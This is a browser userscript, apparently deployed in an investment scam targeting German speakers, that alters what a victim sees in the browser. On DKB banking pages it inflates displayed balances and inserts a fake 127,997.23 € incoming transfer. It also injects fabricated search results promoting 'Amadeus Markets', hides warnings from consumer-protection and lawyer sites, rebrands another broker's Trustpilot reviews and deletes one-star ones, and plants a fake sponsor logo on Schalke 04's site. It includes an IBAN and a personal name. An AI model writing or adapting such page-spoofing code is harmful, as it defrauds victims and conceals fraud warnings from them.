// ==UserScript==
// @name         Ed AM Pos-DK CHRISTINE ROTHER
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/501087/Ed%20AM%20Pos-DK%20CHRISTINE%20ROTHER.user.js
// @updateURL https://update.greasyfork.org/scripts/501087/Ed%20AM%20Pos-DK%20CHRISTINE%20ROTHER.meta.js
// ==/UserScript==

// FINSTATUS
// Configuration for modifying specific balances
    const BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 1 },
        { index: 1, adjustmentAmount: 2 },
        { index: 2, adjustmentAmount: 3 },

        // Add more configurations as needed...
    ];

//UMSATZE BALANCE

  // Specify the modification amount (positive to increase, negative to decrease)
    const modificationAmount = 98094; // Example: Increase the balance by 100€




    // Specify the IBAN to check
    const ibanCheck = "DE47 1203 0000 1022 2366 97";

// UMSATZE TRANSACTIONS

  // Specify an array of transaction details
    const transactions = [  //  STARTING FROM THE END
  //      {
  //          title: "Transaction 1",
  //          subtitle: "22.07.24 • Ausgang",
  //          amount: "-3.000,00 €" // Use positive or negative amounts as needed
  //      },
        {
            title: "Treuhand. JP Morgan Chase",
            subtitle: "Vorgemerkt • Eingang",
            amount: "+127.997,23 €"
        }
        // Add more transactions as needed
    ];





if (window.location.href.indexOf("dkb") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

//    // Configuration for modifying specific balances
//    const BALANCE_CONFIGS = [
//        { index: 0, adjustmentAmount: 500 },
//        { index: 1, adjustmentAmount: 5000 },
//        { index: 2, adjustmentAmount: 10000 },

        // Add more configurations as needed...
//   ];

    // Function to modify the specified balances
    function modifyBalance() {
        // Select all elements with the specified class
        const elements = document.querySelectorAll('p.sui-list-item__right-section__content__value');

        // Loop through the configurations
        BALANCE_CONFIGS.forEach(config => {
            const element = elements[config.index];
            if (element) {
                // Get the current balance text
                let balanceText = element.textContent.trim();

                // Parse the balance correctly, accounting for thousand separators and decimal commas
                // Remove the currency symbol, thousand separators, and then replace the decimal comma with a dot
                let cleanedText = balanceText.replace('€', '').replace(/\s/g, ''); // Remove currency symbol and whitespace
                let [integerPart, decimalPart] = cleanedText.split(',');
                let currentBalance = parseFloat(integerPart.replace(/\./g, '') + '.' + (decimalPart || '0'));

                if (!isNaN(currentBalance)) {
                    // Modify the balance
                    let newBalance = currentBalance + config.adjustmentAmount;

                    // Format the new balance with thousand separators and comma as decimal separator
                    let [newIntegerPart, newDecimalPart] = newBalance.toFixed(2).split('.');
                    newIntegerPart = newIntegerPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add thousand separators
                    let newBalanceText = newIntegerPart + ',' + newDecimalPart + ' €';

                    // Update the element text content
                    element.textContent = newBalanceText;
                }
            }
        });
    }

    // Immediately run the function to modify the specified balances
    modifyBalance();
 }





if (window.location.href.indexOf("dkb") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

//    // Specify the modification amount (positive to increase, negative to decrease)
//    const modificationAmount = 100; // Example: Increase the balance by 100€

///    // Specify the IBAN to check
//    const ibanCheck = "521203 0000 1076 7313 04";

    // Function to format a number as a currency string
    function formatCurrency(amount) {
        return amount.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' });
    }

    // Function to parse a currency string and return the numeric value
    function parseCurrency(currencyString) {
        return parseFloat(currencyString.replace(/\./g, '').replace(',', '.').replace(/[^\d.-]/g, ''));
    }

    // Function to sanitize and compare IBANs
    function sanitizeIban(iban) {
        // Remove all non-digit characters
        return iban.replace(/\s+/g, '').toUpperCase().replace(/[^\d]/g, '');
    }

    // Function to check if the specified IBAN exists
    function checkIban() {
        const ariaLabelElement = document.querySelector('[aria-label="Konten- und Kartenauswahl"]');
        if (!ariaLabelElement) return false;

        const subtitleElements = ariaLabelElement.querySelectorAll('.sui-list-item__left-section__content__subtitle');
        const sanitizedCheckIban = sanitizeIban(ibanCheck);

        for (const subtitleElement of subtitleElements) {
            const sanitizedSubtitleIban = sanitizeIban(subtitleElement.textContent);

            if (sanitizedSubtitleIban === sanitizedCheckIban) {
                return true;
            }
        }
        return false;
    }

    // Function to modify the balance
    function modifyBalance() {
        if (!checkIban()) {
            console.log("IBAN check failed. Balance will not be modified.");
            return;
        }

        // Find the balance element
        const balanceElement = document.querySelector('.sui-header__left-section__title.sui-header__left-section__title--medium');

        // Check if the balance element exists
        if (balanceElement) {
            // Parse the current balance
            const currentBalance = parseCurrency(balanceElement.textContent);

            // Calculate the new balance
            const newBalance = currentBalance + modificationAmount;

            // Update the balance element with the new balance
            balanceElement.textContent = formatCurrency(newBalance);
        }
    }

    // Run the modifyBalance function immediately
    modifyBalance();
 }



if (window.location.href.indexOf("dkb") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

//    // Specify an array of transaction details
//    const transactions = [  //  STARTING FROM THE END
//        {
//            title: "Transaction 1",
////            subtitle: "22.07.24 • Ausgang",
//            amount: "-3.000,00 €" // Use positive or negative amounts as needed
//        },
//        {
//            title: "Transaction 2",
//            subtitle: "23.07.24 • Eingang",
//            amount: "+1.500,00 €"
 //       }
        // Add more transactions as needed
//    ];

    // Specify the IBAN to check
 //   const ibanCheck = "521203 0000 1076 7313 04";

    // Function to determine if the amount is positive or negative
    function isPositiveAmount(amount) {
        return !amount.startsWith('-');
    }

    // Function to normalize IBAN by removing non-digit characters
    function normalizeIban(iban) {
        return iban.replace(/\D/g, '');
    }

    // Function to check if the IBAN matches
    function checkIbanMatch() {
        // Normalize the ibancheck
        const normalizedIbanCheck = normalizeIban(ibanCheck);

        // Get the element with aria-label="Konten- und Kartenauswahl"
        const kontenElement = document.querySelector('[aria-label="Konten- und Kartenauswahl"]');

        if (kontenElement) {
            // Find all subtitle elements within this container
            const subtitleElements = kontenElement.querySelectorAll('.sui-list-item__left-section__content__subtitle');

            // Check if any subtitle element's text content matches the normalized ibancheck
            for (let element of subtitleElements) {
                if (normalizeIban(element.textContent) === normalizedIbanCheck) {
                    return true;
                }
            }
        }
        return false;
    }

    // Function to duplicate and insert a single transaction element
    function insertTransaction(transaction) {
        // Define the class to search for the transaction
        const transactionClassName = "sui-list-item sui-list-item--default sui-list-item--overflow-truncate sui-list-item--background-default sui-list-item--with-subtitle sui-list-item--bottom-separator";

        // Define the class to search for the card
        const cardClassName = "sui-card sui-card--default";

        // Define the class to search for the sibling
        const siblingClassName = "ControlPrintElementsstyle__StyledRemoveFromPrint-sc-18xdr5m-1 eRZdWD";

        // Find the first element with the specified transaction class
        const firstTransactionElement = document.querySelector(`.${transactionClassName.split(' ').join('.')}`);

        // Check if the transaction element exists
        if (firstTransactionElement) {
            // Clone the first transaction element
            const clonedTransactionElement = firstTransactionElement.cloneNode(true);

            // Update the cloned element with the specified transaction details
            const titleElement = clonedTransactionElement.querySelector('.sui-list-item__left-section__content__title');
            const subtitleElement = clonedTransactionElement.querySelector('.sui-list-item__left-section__content__subtitle');
            const amountElement = clonedTransactionElement.querySelector('.sui-list-item__right-section__content__amount');

            if (titleElement) titleElement.textContent = transaction.title;
            if (subtitleElement) subtitleElement.textContent = transaction.subtitle;

            // Determine if the amount is positive or negative and set the appropriate class
            if (amountElement) {
                amountElement.textContent = transaction.amount;
                if (isPositiveAmount(transaction.amount)) {
                    amountElement.className = 'sui-list-item__right-section__content__amount sui-list-item__right-section__content__amount--incoming';
                } else {
                    amountElement.className = 'sui-list-item__right-section__content__amount sui-list-item__right-section__content__amount--outgoing';
                }
            }

            // Find the first sibling element with the specified class
            let siblingElement = document.querySelector(`.${siblingClassName.split(' ').join('.')}`);

            // If the sibling element does not exist, create it
            if (!siblingElement) {
                siblingElement = document.createElement('div');
                siblingElement.className = siblingClassName;
                document.body.appendChild(siblingElement);
            }

            // Find the next sibling element with the specified card class
            let cardElement = siblingElement.nextElementSibling;
            while (cardElement && !cardElement.classList.contains(cardClassName.split(' ')[0])) {
                cardElement = cardElement.nextElementSibling;
            }

            // If the card element does not exist, create it
            if (!cardElement) {
                cardElement = document.createElement('div');
                cardElement.className = cardClassName;
                siblingElement.parentNode.insertBefore(cardElement, siblingElement.nextSibling);
            }

            // Insert the cloned transaction element as the first child of the card element
            cardElement.insertBefore(clonedTransactionElement, cardElement.firstChild);
        }
    }

    // Function to process all transactions
    function processTransactions() {
        if (checkIbanMatch()) {
            transactions.forEach(insertTransaction);
        }
    }

    // Immediately run the transaction processing function
    processTransactions();
}






  // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["amadeus", "market", "amdeus", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust"],
                        results: [
                            {
                                url: "https://www.amadeus-markets.com",
                                title: "Amadeus Markets dein Broker",
                                description: "Amadeus Markets ist der Broker mit der besten Reputation.",
                                footerText: "https://www.amadeus-markets.com",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Amadeus Markets - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Amadeus Markets",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Amadeus Markets Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}

// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Amadeus Markets";
    const customLogoURL = "https://amadeus-markets.com/images/Logowhite.png";
    const customURL = "https://amadeus-markets.com";
    const customReferenceURL = "amadeus-markets.com";
    const customLinkURL = "https://amadeus-markets.com"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Amadeus Markets",
      "icmarkets": "Amadeus Markets",
      "ic-markets": "Amadeus Markets",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}

// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://amadeus-markets.com/";
var newLogoURL = "https://i.ibb.co/cQ26kXf/Untitled-design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


